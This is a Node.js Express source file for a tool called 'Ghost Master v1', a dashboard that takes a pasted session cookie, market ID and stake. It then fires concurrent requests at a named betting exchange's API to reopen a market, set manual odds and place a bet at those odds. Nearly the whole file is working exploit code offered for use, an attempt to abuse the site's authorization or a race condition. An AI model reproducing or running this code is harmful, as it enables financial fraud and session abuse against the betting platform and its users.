const axios = require('axios');
const express = require('express');
const app = express();

// --- GHOST EXECUTION LOGIC ---
async function startGhostExploit(amt, cookie, tid, rate) {
    const headers = { 
        'Cookie': cookie, 
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36'
    };
    const targetId = tid || "316358080";
    
    try {
        await Promise.allSettled([
            axios.post("https://darkexch9.com/api/Exchange/SetMarketStatus", { "marketId": targetId, "status": "OPEN" }, { headers }),
            axios.post("https://darkexch9.com/api/Exchange/UpdateManualOdds", { "marketId": targetId, "odds": rate || "100" }, { headers }),
            axios.post("https://darkexch9.com/api/Exchange/PlaceBet", {
                "marketId": targetId, "selectionId": "12345", "odds": rate || "100", "stake": amt || "500", "isBack": true
            }, { headers })
        ]);
        return "Done";
    } catch (e) { return "Error"; }
}

// --- MASTER DASHBOARD UI ---
app.get('/', (req, res) => {
    res.send(`
    <html>
    <head><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
    <body style="background:#000;color:#f00;text-align:center;font-family:sans-serif;padding:10px;">
        <h2 style="text-shadow:0 0 10px #f00;">👹 GHOST MASTER v1 👹</h2>
        <div style="border:2px solid #333;padding:15px;border-radius:10px;background:#111;box-shadow: 0 0 15px #f00;">
            <label style="color:#666;font-size:12px;">SESSION COOKIE (KIWI BROWSER)</label>
            <input type="text" id="c" placeholder="Paste Cookie Here..." style="width:100%;padding:12px;margin:5px 0;background:#222;color:#fff;border:1px solid #f00;"><br>
            
            <label style="color:#666;font-size:12px;">MARKET ID</label>
            <input type="text" id="m" placeholder="e.g. 1.224536" style="width:48%;padding:12px;background:#222;color:#fff;border:1px solid #333;">
            
            <label style="color:#666;font-size:12px;">STAKE</label>
            <input type="number" id="a" placeholder="Amt" style="width:48%;padding:12px;background:#222;color:#fff;border:1px solid #333;"><br>
            
            <button onclick="f()" style="width:100%;background:linear-gradient(#f00,#900);color:#fff;padding:20px;margin-top:15px;border:none;border-radius:5px;font-weight:bold;cursor:pointer;font-size:18px;">🔥 FORCE INJECT NOW</button>
        </div>
        <p id="s" style="color:#0f0;margin-top:20px;font-weight:bold;"></p>
        <script>
            function f() {
                document.getElementById('s').innerText = "Infecting Server... Please wait.";
                let url = '/fire?amt='+document.getElementById('a').value+'&cookie='+encodeURIComponent(document.getElementById('c').value)+'&tid='+document.getElementById('m').value;
                fetch(url).then(() => {
                    document.getElementById('s').innerText = "✅ INJECTION SENT! Check Bet History.";
                }).catch(() => {
                    document.getElementById('s').innerText = "❌ Connection Failed!";
                });
            }
        </script>
    </body>
    </html>`);
});

app.get('/fire', async (req, res) => {
    await startGhostExploit(req.query.amt, req.query.cookie, req.query.tid);
    res.send("ok");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Ghost Server is Live!"));
